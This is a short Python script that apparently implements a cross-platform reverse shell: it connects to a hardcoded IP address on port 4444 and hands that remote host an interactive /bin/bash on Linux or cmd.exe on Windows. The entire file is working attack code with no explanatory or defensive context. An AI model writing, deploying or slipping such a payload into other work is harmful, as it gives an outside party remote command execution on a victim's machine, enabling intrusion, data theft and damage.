import platform
import socket
import subprocess
import os
import pty
import threading

operating = platform.system()
shell_ip = "10.245.240.200"
port = 4444


if operating == "Linux":
    s = socket.socket()
    s.connect((shell_ip, port))
    [os.dup2(s.fileno(),f) for f in(0,1,2)]
    pty.spawn("/bin/bash")
elif operating == "Windows":
    s = socket.socket()
    s.connect((shell_ip, port))
    p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    threading.Thread(target=lambda:[s.send(p.stdout.read(1)) for x in iter(int, 1)]).start()
    [p.stdin.write(s.recv(1024)) or p.stdin.flush() for x in iter(int, 1)]


